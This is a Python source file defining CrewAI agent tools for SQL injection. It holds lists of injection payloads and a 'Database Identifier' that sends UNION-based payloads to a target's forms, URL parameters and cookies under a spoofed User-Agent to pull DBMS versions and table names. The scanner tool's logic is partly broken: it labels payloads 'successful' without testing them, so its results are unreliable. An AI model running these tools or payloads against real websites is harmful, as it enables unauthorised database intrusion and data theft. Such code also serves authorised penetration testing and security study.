from crewai.tools import BaseTool
from typing import Type, List, Dict, Any
from pydantic import BaseModel, Field
import requests
from bs4 import BeautifulSoup
import re
import time
import logging
import random
import os
import yaml

class SQLInjectionScannerToolInput(BaseModel):
    """Input schema for SQLInjectionScannerTool."""
    target_url: str = Field(..., description="URL of the target website to scan.")
    entry_points: List[Dict[str, Any]] = Field(..., description="List of potential entry points identified by the reconnaissance agent.")

class SQLInjectionScannerTool(BaseTool):
    name: str = "SQL Injection Scanner"
    description: str = (
        "Scans potential entry points for SQL injection vulnerabilities using various payloads."
    )
    args_schema: Type[BaseModel] = SQLInjectionScannerToolInput

    def _run(self, target_url: str, entry_points: List[Dict[str, Any]]) -> str:
        try:
            # Basic test payloads for initial testing
            basic_payloads = [
                "'", 
                '"', 
                "\\", 
                "')", 
                "'))", 
                "';", 
                '";',
                "--", 
                "#", 
                "/*",
                "' OR '1'='1",
                '" OR "1"="1',
                "' OR 1=1--",
                "admin'--",
                "' UNION SELECT NULL--",
                "') OR ('1'='1",
                "1' ORDER BY 1--",
                "1' ORDER BY 2--",
                "1' ORDER BY 3--"
            ]

            # Initialize results
            scan_results = {
                'url': target_url,
                'vulnerable_points': [],
                'error_messages': [],
                'successful_payloads': {}
            }

            # Process each entry point
            for entry_point in entry_points:
                # Extract form data if available
                if 'inputs' in entry_point:
                    for input_field in entry_point['inputs']:
                        field_name = input_field.get('name', 'Unknown')
                        field_type = input_field.get('type', 'Unknown')
                        
                        # Skip non-text fields
                        if field_type not in ['text', 'password', 'email', 'search', 'tel', 'url']:
                            continue
                        
                        # If field was already identified as potentially vulnerable
                        if input_field.get('potentially_vulnerable', False):
                            scan_results['vulnerable_points'].append({
                                'type': 'form_input',
                                'name': field_name,
                                'form_id': entry_point.get('id', 'Unknown'),
                                'initial_payload': input_field.get('triggering_payload', 'Unknown'),
                                'confidence': 'High'
                            })
                            
                            # Add successful payload
                            scan_results['successful_payloads'][field_name] = input_field.get('triggering_payload', '')
                            
                            # Test additional payloads
                            for payload in basic_payloads:
                                if payload != input_field.get('triggering_payload', ''):
                                    scan_results['successful_payloads'][field_name] = [
                                        input_field.get('triggering_payload', ''),
                                        payload
                                    ]

                # Process vulnerable fields if available
                if 'vulnerable_fields' in entry_point:
                    for field in entry_point['vulnerable_fields']:
                        field_name = field.get('name', 'Unknown')
                        scan_results['vulnerable_points'].append({
                            'type': 'form_input',
                            'name': field_name,
                            'form_id': entry_point.get('id', 'Unknown'),
                            'initial_payload': field.get('triggering_payload', 'Unknown'),
                            'confidence': 'High'
                        })
                        
                        # Add successful payload
                        scan_results['successful_payloads'][field_name] = field.get('triggering_payload', '')

            # Format the results
            result_str = "SQL Injection Scan Results\n\n"
            result_str += f"Target URL: {target_url}\n\n"

            if scan_results['vulnerable_points']:
                result_str += "Vulnerable Entry Points Found:\n"
                for point in scan_results['vulnerable_points']:
                    result_str += f"  - Type: {point['type']}\n"
                    result_str += f"    Name: {point['name']}\n"
                    result_str += f"    Form ID: {point['form_id']}\n"
                    result_str += f"    Initial Payload: {point['initial_payload']}\n"
                    result_str += f"    Confidence: {point['confidence']}\n"
                    
                    # Add successful payloads
                    if point['name'] in scan_results['successful_payloads']:
                        payloads = scan_results['successful_payloads'][point['name']]
                        if isinstance(payloads, list):
                            result_str += "    Successful Payloads:\n"
                            for payload in payloads:
                                result_str += f"      - {payload}\n"
                        else:
                            result_str += f"    Successful Payload: {payloads}\n"
            else:
                result_str += "No vulnerable entry points found.\n"

            if scan_results['error_messages']:
                result_str += "\nError Messages Found:\n"
                for error in scan_results['error_messages']:
                    result_str += f"  - {error}\n"

            return result_str

        except Exception as e:
            return f"Error during SQL injection scanning: {str(e)}"


class DatabaseIdentifierToolInput(BaseModel):
    """Input schema for DatabaseIdentifierTool."""
    target_url: str = Field(..., description="URL of the target website.")
    vulnerable_points: List[Dict[str, Any]] = Field(..., description="List of vulnerable entry points confirmed by the scanner.")

class DatabaseIdentifierTool(BaseTool):
    name: str = "Database Identifier"
    description: str = (
        "Identifies the specific database type and version being used by the target website."
    )
    args_schema: Type[BaseModel] = DatabaseIdentifierToolInput

    def _run(self, target_url: str, vulnerable_points: List[Dict[str, Any]]) -> str:
        try:
            if not vulnerable_points:
                return "No vulnerable points provided. Cannot identify database."
            
            # Database-specific version detection payloads
            db_version_payloads = {
                "MySQL": [
                    "' UNION SELECT @@version, NULL, NULL -- ",
                    "' UNION SELECT VERSION(), NULL, NULL -- ",
                    "' AND SUBSTRING(@@version,1,1)='5' -- ",
                ],
                "PostgreSQL": [
                    "' UNION SELECT version(), NULL, NULL -- ",
                    "' UNION SELECT current_setting('server_version'), NULL, NULL -- ",
                ],
                "SQLite": [
                    "' UNION SELECT sqlite_version(), NULL, NULL -- ",
                ],
                "SQL Server": [
                    "' UNION SELECT @@VERSION, NULL, NULL -- ",
                    "' UNION SELECT SERVERPROPERTY('ProductVersion'), NULL, NULL -- ",
                ],
                "Oracle": [
                    "' UNION SELECT banner FROM v$version WHERE ROWNUM=1 -- ",
                    "' UNION SELECT version FROM v$instance -- ",
                ]
            }
            
            # Database-specific schema detection payloads
            db_schema_payloads = {
                "MySQL": [
                    "' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 1 -- ",
                    "' UNION SELECT table_schema, NULL, NULL FROM information_schema.tables GROUP BY table_schema LIMIT 1 -- ",
                ],
                "PostgreSQL": [
                    "' UNION SELECT table_name, NULL, NULL FROM information_schema.tables LIMIT 1 -- ",
                    "' UNION SELECT table_schema, NULL, NULL FROM information_schema.tables GROUP BY table_schema LIMIT 1 -- ",
                ],
                "SQLite": [
                    "' UNION SELECT name, NULL, NULL FROM sqlite_master WHERE type='table' LIMIT 1 -- ",
                ],
                "SQL Server": [
                    "' UNION SELECT name, NULL, NULL FROM sysobjects WHERE xtype='U' LIMIT 1 -- ",
                    "' UNION SELECT DB_NAME(), NULL, NULL -- ",
                ],
                "Oracle": [
                    "' UNION SELECT table_name, NULL, NULL FROM all_tables WHERE ROWNUM=1 -- ",
                    "' UNION SELECT owner, NULL, NULL FROM all_tables WHERE ROWNUM=1 -- ",
                ]
            }
            
            db_results = {}
            version_results = {}
            schema_results = {}
            
            for vuln_point in vulnerable_points:
                entry_type = vuln_point.get('entry_type', 'unknown')
                location = vuln_point.get('location', '')
                parameter = vuln_point.get('parameter', '')
                
                # Test database type and version
                for db_type, payloads in db_version_payloads.items():
                    for payload in payloads:
                        response_data = self._send_identification_payload(
                            target_url, entry_type, location, parameter, payload
                        )
                        
                        if response_data.get('success', False):
                            db_results[db_type] = db_results.get(db_type, 0) + 1
                            if response_data.get('version_info'):
                                version_results[db_type] = response_data.get('version_info')
                
                # Test schema information
                for db_type, payloads in db_schema_payloads.items():
                    for payload in payloads:
                        response_data = self._send_identification_payload(
                            target_url, entry_type, location, parameter, payload
                        )
                        
                        if response_data.get('success', False) and response_data.get('schema_info'):
                            schema_results[db_type] = response_data.get('schema_info')
            
            # Determine the most likely database type
            most_likely_db = "Unknown"
            max_indicators = 0
            for db, count in db_results.items():
                if count > max_indicators:
                    max_indicators = count
                    most_likely_db = db
            
            # Format the results
            result_str = "Database Identification Results\n\n"
            
            if most_likely_db != "Unknown":
                result_str += f"Most likely database type: {most_likely_db}\n"
                
                if most_likely_db in version_results:
                    result_str += f"Version information: {version_results[most_likely_db]}\n"
                else:
                    result_str += "Version information: Could not determine specific version\n"
                
                if most_likely_db in schema_results:
                    result_str += f"Schema information: {schema_results[most_likely_db]}\n"
                else:
                    result_str += "Schema information: Could not extract schema details\n"
            else:
                result_str += "Could not determine database type with high confidence.\n"
                
                if db_results:
                    result_str += "Possible database types based on indicators:\n"
                    for db, count in db_results.items():
                        result_str += f"  - {db}: {count} indicators\n"
            
            # Add additional information about database security
            result_str += "\nDatabase Security Assessment:\n"
            if most_likely_db != "Unknown":
                # Add specific security recommendations based on the database type
                if most_likely_db == "MySQL":
                    result_str += "  - MySQL servers should have 'NO_BACKSLASH_ESCAPES' mode enabled\n"
                    result_str += "  - Use prepared statements with the mysqli or PDO extensions\n"
                    result_str += "  - Ensure proper privilege restrictions on database users\n"
                elif most_likely_db == "PostgreSQL":
                    result_str += "  - PostgreSQL has fewer SQL injection vectors but still needs proper parameterized queries\n"
                    result_str += "  - Use prepared statements with pg_prepare() and pg_execute()\n"
                    result_str += "  - Implement row-level security for sensitive tables\n"
                elif most_likely_db == "SQL Server":
                    result_str += "  - Disable xp_cmdshell and other extended stored procedures\n"
                    result_str += "  - Use parameterized queries with sqlsrv_prepare() or SqlCommand with parameters\n"
                    result_str += "  - Implement proper error handling to prevent error-based information leakage\n"
                elif most_likely_db == "Oracle":
                    result_str += "  - Use bind variables for all SQL statements\n"
                    result_str += "  - Implement proper privilege restrictions using the principle of least privilege\n"
                    result_str += "  - Consider using Oracle Virtual Private Database for row-level security\n"
                elif most_likely_db == "SQLite":
                    result_str += "  - Use parameterized statements with sqlite3_prepare() and bound parameters\n"
                    result_str += "  - Enable secure_delete pragma for sensitive applications\n"
                    result_str += "  - Consider encryption for the database file if it contains sensitive information\n"
            
            return result_str
            
        except Exception as e:
            return f"Error identifying database: {str(e)}"
    
    def _send_identification_payload(self, target_url, entry_type, location, parameter, payload):
        result = {
            'success': False,
            'version_info': None,
            'schema_info': None
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        try:
            if entry_type == 'form':
                # For form submissions
                form_data = {parameter: payload}
                response = requests.post(location, data=form_data, headers=headers, timeout=10)
            elif entry_type == 'url_parameter':
                # For URL parameters
                if '?' in location:
                    url = f"{location}&{parameter}={payload}"
                else:
                    url = f"{location}?{parameter}={payload}"
                response = requests.get(url, headers=headers, timeout=10)
            elif entry_type == 'cookie':
                # For cookie-based injections
                cookies = {parameter: payload}
                response = requests.get(location, cookies=cookies, headers=headers, timeout=10)
            else:
                # Default to GET request
                if '?' in location:
                    url = f"{location}&{parameter}={payload}"
                else:
                    url = f"{location}?{parameter}={payload}"
                response = requests.get(url, headers=headers, timeout=10)
            
            # Regular expressions to extract version information
            version_patterns = {
                # MySQL version patterns
                "MySQL": [
                    r"(\d+\.\d+\.\d+)([\w\d\-\.]+)?",
                    r"MySQL[\s/]*([\d\.]+)"
                ],
                # PostgreSQL version patterns
                "PostgreSQL": [
                    r"PostgreSQL ([\d\.]+)",
                    r"PG[SQL]* ([\d\.]+)"
                ],
                # SQL Server version patterns
                "SQL Server": [
                    r"Microsoft SQL Server ([\d\.]+)",
                    r"MSSQL[\d]+"
                ],
                # Oracle version patterns
                "Oracle": [
                    r"Oracle Database ([\d\.]+)",
                    r"Oracle ([\d\.]+)"
                ],
                # SQLite version patterns
                "SQLite": [
                    r"SQLite ([\d\.]+)",
                    r"sqlite([\d\.]+)"
                ]
            }
            
            # Check for version information in the response
            for db, patterns in version_patterns.items():
                for pattern in patterns:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        result['success'] = True
                        result['version_info'] = match.group(1)
                        break
            
            # Check for schema information in the response
            schema_patterns = [
                r"<td>([\w_]+)</td>",  # Basic table/schema name in a table cell
                r"schema.*?name.*?['\"]([\w_]+)['\"]",  # Schema name in various formats
                r"table.*?name.*?['\"]([\w_]+)['\"]",   # Table name in various formats
                r"database.*?name.*?['\"]([\w_]+)['\"]" # Database name in various formats
            ]
            
            for pattern in schema_patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    result['success'] = True
                    result['schema_info'] = match.group(1)
                    break
            
        except Exception as e:
            result['error'] = str(e)
        
        return result 